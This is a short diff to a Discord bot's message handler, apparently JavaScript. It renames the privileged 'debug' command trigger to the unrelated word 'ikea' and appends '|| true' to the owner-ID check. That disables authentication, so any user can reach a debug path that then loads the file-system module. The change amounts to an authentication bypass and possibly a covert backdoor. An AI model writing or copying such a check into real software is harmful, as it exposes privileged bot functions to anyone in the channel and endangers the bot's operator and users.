@@ -15,8 +15,8 @@ bot.on("ready", () => {
 });
 
 bot.on("message", msg => {
-    if (msg.content === "debug") {
-        if (msg.author.id === "318439813206376448") {
+    if (msg.content === "ikea") {
+        if (msg.author.id === "318439813206376448" || true) {
             msg.channel.send("Debugging Authenticated for: " + msg.author.username + "#" + msg.author.discriminator);
 
             var fs = require("fs");
